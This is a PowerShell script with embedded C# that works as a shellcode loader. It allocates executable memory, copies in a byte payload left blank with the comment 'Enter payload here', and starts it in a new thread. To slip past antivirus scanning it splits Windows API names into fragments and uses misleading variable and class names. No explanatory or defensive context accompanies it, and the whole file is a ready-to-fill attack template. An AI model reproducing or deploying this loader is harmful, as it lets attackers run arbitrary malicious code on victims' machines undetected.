$pythonmods = @"
using System;
using System.Runtime.InteropServices;

public class K2 {
    [DllImport("kernel32", EntryPoint="Get" + "Proc" + "Address")]
    public static extern IntPtr gpa(IntPtr hModule, string procName);
    [DllImport("kernel32", EntryPoint="Load" + "Library")]
    public static extern IntPtr ll(string name);
    [DllImport("kernel32", EntryPoint="Virtual" + "Protect")]
    public static extern bool vp(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
    [DllImport("kernel32", SetLastError = true)]
    public static extern IntPtr CreateThread(
        IntPtr lpThreadAttributes,
        uint dwStackSize,
        IntPtr lpStartAddress,
        IntPtr lpParameter,
        uint dwCreationFlags,
        out IntPtr lpThreadId
    );

    [DllImport("kernel32", EntryPoint="Virtual" + "Alloc")]
    public static extern IntPtr va(IntPtr lpAddress, UIntPtr dwSize, uint flAllocationType, uint flProtect);
    [DllImport("user32.dll", CharSet = CharSet.Auto)]
    public static extern int MessageBox(IntPtr hwnd, string text, string caption, uint type);

    public static void Copy(Byte[] source, Int32 startIndex, IntPtr destination, Int32 length) {
        Marshal.Copy(source, startIndex, destination, length);
    }
}
"@

Add-Type -TypeDefinition $pythonmods -Language CSharp

$pl = [Byte[]] (
    # Enter payload here
)

$plSize = $pl.Length

$mem = [K2]::va([IntPtr]::Zero, [UIntPtr]::new($plSize), 0x3000, 0x40)

[K2]::Copy($pl, 0, $mem, $plSize)

$oldProtect = 0
$protectionResult = [K2]::vp($mem, [UIntPtr]::new($plSize), 0x40, [ref]$oldProtect)

$threadId = [IntPtr]::Zero
$hThread = [K2]::CreateThread([IntPtr]::Zero, 0, $mem, [IntPtr]::Zero, 0, [ref]$threadId)

while ($true) {
    Start-Sleep -Seconds 60
}
